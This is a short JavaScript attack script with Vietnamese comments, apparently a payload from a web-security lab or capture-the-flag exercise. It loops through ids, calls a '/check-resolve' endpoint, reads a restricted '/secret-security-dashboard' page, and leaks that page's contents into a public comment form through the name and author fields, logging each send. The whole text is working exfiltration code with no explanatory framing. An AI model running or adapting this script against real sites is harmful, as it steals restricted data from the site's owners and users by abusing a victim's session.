(async () => {
  for (let id = 1; id <= 8; id++) {
    const txt = await fetch('/check-resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `id=${id}`
    }).then(res => res.text());

    const secret = await fetch('/secret-security-dashboard').then(res => res.text());

    // Gửi dashboard vào trường 'name' (không giới hạn độ dài)
    // và comment bình thường vào 'comment'
    const r = await fetch('/post-comment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `name=${encodeURIComponent(secret)}&comment-author=test${encodeURIComponent(txt)}&comment2=test`
    });
    
    console.log(`Đã gửi ID ${id}, status: ${r.status}`);
    await new Promise(r => setTimeout(r, 300)); 
  }
})();
